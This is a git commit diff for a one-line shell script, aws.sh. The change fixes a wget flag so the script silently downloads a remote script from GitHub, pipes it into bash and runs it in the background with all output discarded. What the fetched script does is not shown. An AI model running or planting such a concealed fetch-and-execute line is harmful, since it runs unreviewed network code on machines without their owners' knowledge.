f4b34b288d6ab86eeef3c0dc04f255ef7c7589fd
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-11 15:12:39 +0800

    Update aws.sh

--- aws.sh
+++ aws.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bash <(wget -qO https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
+bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
